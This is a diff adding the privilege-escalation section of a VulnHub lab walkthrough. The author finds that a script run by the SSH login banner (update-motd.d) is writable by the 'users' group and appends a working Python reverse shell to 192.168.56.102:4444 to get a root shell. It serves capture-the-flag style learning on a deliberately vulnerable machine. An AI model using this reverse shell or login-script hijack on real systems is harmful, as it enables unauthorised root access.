@@ -56,11 +56,26 @@ yes, we found a credential for ssh login :
 
 ## 4.Privilege Escalation
 
+We are part of group `users` so it worth checking if this group has right to access to any files on the system :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ae612d7f-df39-4999-8070-c430d92b054f)
 
+it seems that we can access the file `cube.sh` so let's check the content of it :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/461acf2e-1510-4591-8dbe-6867bde41bb7)
 
+it is the same text we get when we login to the server, so it like the banner of the ssh login.
 
+so it worth checking `update-motd.d` to see if this script is present here :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4ed8df5a-934f-47b9-b676-db56069801f2)
 
+yes, the file `00-header` is using this script :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/59e9eaeb-d7ec-4f2b-825f-47a880b71e41)
+
+i just add a python3 reverse shell to `cube.sh` to get another shell as user root :
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
